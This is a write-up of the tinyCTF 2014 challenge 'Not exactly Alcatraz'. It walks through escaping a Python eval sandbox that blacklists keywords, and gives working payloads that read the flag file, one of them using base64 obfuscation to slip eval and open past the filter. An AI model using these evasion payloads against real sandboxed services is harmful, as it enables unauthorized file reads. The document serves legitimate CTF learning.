# tinyCTF 2014: Not exactly Alcatraz

**Category:** Exploitable
**Points:** 200
**Description:**

> [Exploit this](pwn200.zip)
> Over here: `nc 54.69.118.120 6000`
> Flag is in `/home/pybaby/flag.txt`

## Write-up

Let’s unzip [the provided `pwn200.zip` file](pwn200.zip):

```bash
$ unzip pwn200.zip
Archive:  pwn200.zip
  inflating: pwn200
```

The extracted `pwn200` file is a Python script.

```bash
$ python pwn200

Welcome to Safe Interactive CPython Shell (SICS)
================================================

Rules:
    - Wash your dishes
    - Don't eat the yellow snow
    - Do not import anything
    - No peeking at files!

baby@sics:~$
1 + 1
2
```

The script evaluates any Python code we enter, as long as it doesn’t contain the blacklisted words `import`, `open`, `flag`, `eval`, or `exec`. We need to find a way to break out of the sandbox and still read files.

The simplest solution is to use `file` instead of `open`:

```python
file('/home/pybaby/fl\x61g.txt').read()
```

Another possible solution that allows more generic code execution is the following:

```python
__builtins__.__dict__['ZXZhbA=='.decode('base64')]('b3BlbignL2hvbWUvcHliYWJ5L2ZsYWcudHh0JykucmVhZCgp'.decode('base64'))
```

`__builtins__.__dict__['ZXZhbA=='.decode('base64')]` is equivalent to `eval`, and `'b3BlbignL2hvbWUvcHliYWJ5L2ZsYWcudHh0JykucmVhZCgp'.decode('base64')` is `open('/home/pybaby/flag.txt').read()`. This prints the contents of the `/home/pybaby/flag.txt` file:

```
baby@sics:~$
__builtins__.__dict__['ZXZhbA=='.decode('base64')]('b3BlbignL2hvbWUvcHliYWJ5L2ZsYWcudHh0JykucmVhZCgp'.decode('base64'))
flag{python_sandboxing:_harder_than_teaching_your_mom_dota}

this is bad.

BitK vous fait des gros bisous

baby@sics:~$
```

The flag is `flag{python_sandboxing:_harder_than_teaching_your_mom_dota}`.

## Other write-ups and resources

* <http://sugarstack.io/tinyctf-exp-200.html>
* <https://poerhiza.github.io/ctf/2014/10/05/tinyCTF-write_ups-not_exactly_alcatraz/>
* [_Escaping Python sandboxes_](https://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/)
* <https://github.com/evanowe/TinyCTF2014-writeups/blob/master/README.md#not-exactly-alcatraz>
* <https://github.com/jesstess/tinyctf/blob/master/alcatraz/alcatraz.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
